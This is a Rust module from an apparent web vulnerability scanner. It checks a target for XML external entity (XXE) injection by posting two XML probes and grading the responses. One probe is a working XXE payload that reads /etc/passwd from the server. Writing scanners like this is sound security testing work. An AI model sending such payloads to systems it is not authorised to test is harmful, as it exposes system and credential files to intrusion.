use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;
use std::collections::HashMap;

/// XXE / XML injection scanner. Crazy sends external/DTD payloads (safe, no OOB by default).
pub async fn scan(http: &HttpClient, target: &str, _mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let url = target.trim_end_matches('/').to_string();
    let probes = vec![
        ("XXE file read", r#"<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"#),
        ("XXE internal", r#"<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe "XXE_TEST_MARKER">]><x>&xxe;</x>"#),
    ];
    for (label, body) in probes {
        let mut headers = HashMap::new();
        headers.insert("Content-Type".into(), "application/xml".into());
        if let Ok((st, _h, resp, _f)) = http.fetch(&url, reqwest::Method::POST, Some(body), Some(headers)).await {
            let lb = resp.to_lowercase();
            if lb.contains("xxe_test_marker") || lb.contains("root:x:") {
                out.push(Finding::new(Severity::High, "XXE", "XML external entity injection", target)
                    .with_payload(label)
                    .with_evidence("entity expanded in response")
                    .with_confidence(85));
            } else if st == 500 {
                out.push(Finding::new(Severity::Low, "XXE", "XML parser error (parsing user XML)", target)
                    .with_payload(label)
                    .with_evidence("500 on XML body, possible weak parser")
                    .with_confidence(30));
            }
        }
    }
    Ok(out)
}
